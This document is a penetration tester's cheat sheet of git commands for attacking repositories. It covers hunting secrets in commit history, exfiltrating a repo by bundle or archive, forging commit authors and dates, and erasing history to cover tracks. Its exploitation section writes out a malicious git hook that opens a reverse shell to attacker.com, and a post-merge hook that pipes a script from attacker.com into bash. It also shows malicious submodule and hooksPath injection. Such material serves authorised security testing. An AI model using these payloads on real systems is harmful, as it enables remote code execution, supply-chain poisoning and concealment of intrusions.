# 🔐 Git Commands — Penetration Tester Cheat Sheet

> **Tags:** #git #pentest #recon #osint #cheatsheet  
> **Last Updated:** 2026-05-22  
> **Author:** Pentest Notes

---

## 📑 Table of Contents

- [[#⚙️ Setup & Config]]
- [[#🔍 Recon & OSINT via Git]]
- [[#📦 Cloning & Enumeration]]
- [[#🕵️ History & Secret Hunting]]
- [[#🌿 Branch & Tag Enumeration]]
- [[#📤 Exfiltration Techniques]]
- [[#🛠️ Git for Payload Delivery]]
- [[#🐛 Exploitation via Git Features]]
- [[#🧹 Covering Tracks]]
- [[#🔗 Useful Tools & References]]

---

## ⚙️ Setup & Config

```bash
# Set identity (useful for impersonation testing / social engineering)
git config --global user.name "John Doe"
git config --global user.email "john@target.com"

# Set identity per-repo only (non-persistent)
git config user.name "auditor"
git config user.email "audit@internal.corp"

# View all config (may leak credentials/tokens stored by user)
git config --list
git config --list --show-origin

# Find credentials stored in config
cat ~/.gitconfig
cat .git/config

# Check for credential helpers (may expose stored passwords)
git config --global credential.helper
```

> [!warning] Credential Helper Leaks  
> `credential.helper=store` stores plaintext passwords in `~/.git-credentials`

---

## 🔍 Recon & OSINT via Git

```bash
# Clone a public target repo for analysis
git clone https://github.com/target-org/repo.git

# Clone with full history (important — don't use --depth)
git clone --mirror https://github.com/target-org/repo.git

# List all remote branches without cloning
git ls-remote https://github.com/target-org/repo.git

# List tags remotely
git ls-remote --tags https://github.com/target-org/repo.git

# Check open .git directories on web servers
curl -s https://target.com/.git/config
curl -s https://target.com/.git/HEAD
```

> [!tip] Exposed `.git` Folder  
> If `/.git/` is accessible on a web server, the entire repo can be reconstructed using tools like **git-dumper** or **GitHack**.

```bash
# Reconstruct exposed .git directory
git-dumper http://target.com/.git/ ./output-dir
```

---

## 📦 Cloning & Enumeration

```bash
# Shallow clone (faster, less data — avoids full history)
git clone --depth 1 https://github.com/target/repo.git

# Full mirror clone (all refs, branches, tags)
git clone --mirror https://github.com/target/repo.git

# Clone via SSH (useful when SSH key is compromised)
git clone git@github.com:target-org/private-repo.git

# Clone specific branch
git clone -b dev https://github.com/target/repo.git

# List all files tracked by git (including deleted ones)
git ls-files
git ls-files --deleted
git ls-files --others --exclude-standard  # untracked files

# Show full file tree of a specific commit
git ls-tree -r HEAD --name-only
git ls-tree -r <commit-hash> --name-only
```

---

## 🕵️ History & Secret Hunting

```bash
# Show full commit log with patch diffs
git log -p

# Search commit messages for keywords
git log --all --grep="password"
git log --all --grep="secret"
git log --all --grep="key"
git log --all --grep="token"
git log --all --grep="TODO"

# Search file content across ALL commits (pickaxe)
git log --all -S "password"
git log --all -S "BEGIN RSA PRIVATE KEY"
git log --all -S "api_key"
git log --all -S "AWS_SECRET"

# Search with regex across all commits
git log --all -G "pass(word)?[[:space:]]*="

# Show diff of a specific commit
git show <commit-hash>

# Show a deleted file from history
git show <commit-hash>:<path/to/file>

# Restore a deleted file from a past commit
git checkout <commit-hash> -- path/to/file

# Show all refs (branches + tags) and their commits
git log --oneline --all --decorate --graph

# Find dangling commits (unreachable — may contain removed secrets)
git fsck --lost-found
git fsck --unreachable

# View stash (developers often stash sensitive work-in-progress)
git stash list
git stash show -p stash@{0}
```

> [!danger] Secret Hunting Priority  
> Always check: `git log -p`, stashes, deleted branches, and dangling commits. Developers often commit secrets and then delete them — but history remains.

### 🔧 Automated Secret Scanners

|Tool|Use Case|
|---|---|
|`truffleHog`|Scans git history for high-entropy strings & regex patterns|
|`gitleaks`|Fast secrets scanner with many built-in rules|
|`git-secrets`|AWS-focused secret prevention/detection|
|`detect-secrets`|Yelp's entropy-based scanner|

```bash
# TruffleHog — scan entire git history
trufflehog git https://github.com/target/repo.git

# Gitleaks — scan local repo
gitleaks detect --source . --verbose

# Gitleaks — scan remote repo
gitleaks detect --source https://github.com/target/repo.git
```

---

## 🌿 Branch & Tag Enumeration

```bash
# List all local branches
git branch

# List all remote branches
git branch -r

# List all branches (local + remote)
git branch -a

# Checkout a remote branch for inspection
git checkout -b dev origin/dev

# List all tags
git tag -l

# Show what a tag points to
git show v1.0.0

# Check out a tag
git checkout tags/v1.0.0

# Find branches that contain a specific commit
git branch -a --contains <commit-hash>

# List merged branches (may reveal completed features / old attack surface)
git branch -a --merged
```

---

## 📤 Exfiltration Techniques

```bash
# Bundle entire repo into a single file (great for exfil)
git bundle create repo-backup.bundle --all

# Verify bundle
git bundle verify repo-backup.bundle

# Clone from bundle
git clone repo-backup.bundle cloned-repo

# Archive specific branch as tar.gz
git archive --format=tar.gz --output=repo.tar.gz HEAD

# Archive specific directory only
git archive --format=zip HEAD path/to/sensitive/dir > subdir.zip

# Create patch file from commits (portable exfil format)
git format-patch HEAD~5..HEAD -o ./patches/
```

---

## 🛠️ Git for Payload Delivery

```bash
# Add a malicious file and commit
git add payload.sh
git commit -m "fix: update deployment script"
git push origin main

# Force push to overwrite history (requires write access)
git push --force origin main

# Amend last commit (change message or content silently)
git commit --amend --no-edit

# Inject into commit metadata (author/date manipulation)
git commit --amend --author="Admin <admin@target.com>"
GIT_COMMITTER_DATE="2024-01-01T10:00:00" git commit --amend --no-edit

# Create a fake merge commit
git merge --no-ff feature-branch -m "Merge approved changes"
```

> [!note] Supply Chain Attacks  
> If write access is obtained to a dependency repo, malicious code can be committed and propagated to all consumers.

---

## 🐛 Exploitation via Git Features

### Git Hooks (Local Persistence / RCE)

```bash
# Location of hooks in any repo
ls .git/hooks/

# Malicious pre-commit hook (executes on every commit)
echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/4444 0>&1' > .git/hooks/pre-commit
chmod +x .git/hooks/pre-commit

# Post-merge hook (triggers on git pull — great for poisoned repos)
cat > .git/hooks/post-merge << 'EOF'
#!/bin/bash
curl -s http://attacker.com/shell.sh | bash
EOF
chmod +x .git/hooks/post-merge
```

> [!danger] Git Pull RCE  
> If a victim runs `git pull` on a repo with a malicious `post-merge` hook, code executes silently.

### Git Submodule Abuse

```bash
# Add a malicious submodule pointing to attacker-controlled repo
git submodule add https://github.com/attacker/malicious-lib lib/utils
git commit -m "chore: add utility library"

# Initialize and update submodules (victim side — triggers clone)
git submodule update --init --recursive
```

### `.gitconfig` Injection

```bash
# If you can write to ~/.gitconfig, inject core.hooksPath
git config --global core.hooksPath /tmp/evil-hooks/

# Or inject via repo-level config
echo '[core]' >> .git/config
echo '    hooksPath = /tmp/evil-hooks/' >> .git/config
```

---

## 🧹 Covering Tracks

```bash
# Rewrite commit history to remove a file entirely
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch path/to/secret.txt" \
  --prune-empty --tag-name-filter cat -- --all

# Modern alternative: git-filter-repo (faster)
git filter-repo --path secret.txt --invert-paths

# Remove a commit entirely (rebase)
git rebase -i HEAD~3  # then drop the target commit

# Garbage collect and expire reflog (erase dangling refs)
git reflog expire --expire=now --all
git gc --prune=now --aggressive

# Rewrite author info across entire history
git filter-branch --env-filter '
  GIT_AUTHOR_NAME="New Name"
  GIT_AUTHOR_EMAIL="new@email.com"
  GIT_COMMITTER_NAME="New Name"
  GIT_COMMITTER_EMAIL="new@email.com"
' -- --all

# Force push rewritten history
git push --force --all
```

> [!warning] Reflog on Remote  
> Remote servers (GitHub/GitLab) retain their own reflogs. Force-pushing locally does not guarantee deletion from server-side history.

---

## 🔗 Useful Tools & References

### Tools

|Tool|Description|Link|
|---|---|---|
|`truffleHog`|Secret scanning in git history|https://github.com/trufflesecurity/trufflehog|
|`gitleaks`|Fast SAST for secrets|https://github.com/gitleaks/gitleaks|
|`git-dumper`|Dump exposed `.git` directories|https://github.com/arthaud/git-dumper|
|`GitHack`|Reconstruct repos from `.git` exposure|https://github.com/lijiejie/GitHack|
|`git-filter-repo`|History rewriting (replace filter-branch)|https://github.com/newren/git-filter-repo|
|`gitjacker`|Steal repos from misconfigured `.git`|https://github.com/liamg/gitjacker|
|`git-hound`|Search exposed git repos for secrets|https://github.com/ezekg/git-hound|

### Key Files to Check in Any Repo

```
.git/config          → credentials, remote URLs, hooks config
.git/COMMIT_EDITMSG  → last commit message
.git/logs/HEAD       → full reflog
.env                 → environment variables / API keys
.env.local           → local overrides (often not in .gitignore)
config/database.yml  → DB credentials
secrets.yml          → app secrets
id_rsa               → private SSH keys
*.pem / *.key        → certificates and private keys
terraform.tfstate    → infrastructure secrets in plaintext
```

### Common `.gitignore` Bypass

```bash
# Files ignored by .gitignore are still findable if previously committed
git log --all --full-history -- "**/*.env"
git log --all --full-history -- "**/id_rsa"

# Force-add an ignored file (useful for testing)
git add -f .env
```

